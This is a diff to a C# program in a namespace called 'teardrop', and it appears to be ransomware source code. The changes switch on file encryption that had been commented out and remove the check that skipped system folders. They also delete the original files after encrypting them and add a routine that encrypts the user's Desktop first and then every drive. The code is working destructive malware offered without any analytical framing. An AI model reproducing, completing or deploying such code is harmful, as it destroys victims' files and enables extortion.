@@ -129,7 +129,7 @@ namespace teardrop
                         try
                         {
                             file = Directory.GetFiles(Path.GetFullPath(folder));
-                        } catch { }
+                        } catch (Exception ex) { write(ex.Message); }
 
                         foreach(string s in file)
                         {
@@ -147,10 +147,20 @@ namespace teardrop
                                 "System32", "WinSxS", "Program Files"
                             };
 
-                            if (validExtensions.Contains(ext) && !skipPath.Contains(s))
+                            if (validExtensions.Contains(ext))
                             {
                                 // Uncomment Line below to encrypt files
-                                //Crypto.FileEncrypt(s, Properties.Settings.Default.key);
+                                Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
+
+                                try
+                                {
+                                    File.Delete(s);
+                                }
+                                catch(Exception ex2)
+                                {
+                                    write("Cant delete file " + ex2.Message);
+                                }
+
                                 write("Encrypted " + s);
                             }
 
@@ -160,7 +170,7 @@ namespace teardrop
                     }
                 }
             }
-            catch (UnauthorizedAccessException e) { write(e.Message); }
+            catch (Exception e) { write(e.Message); }
             
         }
 
@@ -168,8 +178,40 @@ namespace teardrop
         {
             try
             {
-                write("Getting Drives...");
+                // Encrypt Desktop Files first!
+                string[] desktopFiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories);
+                foreach(string s in desktopFiles)
+                {
+                    try
+                    {
+                        if (!s.Contains(Properties.Settings.Default.extension))
+                        {
+                            Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
+                            write("Encrypted " + s);
 
+                            try
+                            {
+                                File.Delete(s);
+                            }
+                            catch (Exception ex2)
+                            {
+                                write("Cant delete file " + ex2.Message);
+                            }
+                        }
+                        else
+                        {
+
+                        }
+                    }
+                    catch
+                    {
+
+                    }
+                }
+
+
+                write("Getting Drives...");
+                // Now Encrypt whole hard drive
                 foreach (var drive in DriveInfo.GetDrives())
                 {
                     try
